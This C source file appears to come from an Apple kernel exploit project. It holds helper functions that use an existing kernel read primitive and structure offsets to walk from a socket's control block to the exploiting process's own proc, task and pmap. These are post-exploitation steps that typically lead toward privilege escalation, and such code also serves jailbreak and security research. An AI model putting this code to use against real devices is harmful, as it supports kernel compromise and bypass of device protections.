#include "kmem.h"

#include "krw.h"

// NOTE: this is not part of the original exploit
// but shows us how to find interesting structs from socket so_background_thread
uint64_t find_self_proc(void) {
    // inpcb -> inp_socket
    uint64_t control_socket_addr = early_kread64(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_socket);
    // socket -> so_background_thread
    uint64_t self_thread = early_kread64(control_socket_addr + g_ctx.offsets.socket_so_background_thread);
    // thread -> thread_ro
    uint64_t self_thread_ro = early_kread64(self_thread + g_ctx.offsets.thread_t_ro);
    // thread_ro -> proc
    uint64_t self_proc = early_kread64(self_thread_ro + g_ctx.offsets.thread_ro_proc);
    return self_proc;
}

uint64_t task_from_proc(uint64_t proc) {
    uint64_t proc_ro = early_kread64(proc + g_ctx.offsets.proc_p_ro);
    uint64_t task = early_kread64(proc_ro + g_ctx.offsets.proc_ro_task);
    return task;
}

uint64_t pmap_from_task(uint64_t task) {
    uint64_t task_map = early_kread64(task + g_ctx.offsets.task_map);
    uint64_t pmap = early_kread64(task_map + 0x40);
    // uint64_t tte = early_kread64(pmap);
    // uint64_t ttep = early_kread64(pmap + 0x8);
    return pmap;
}
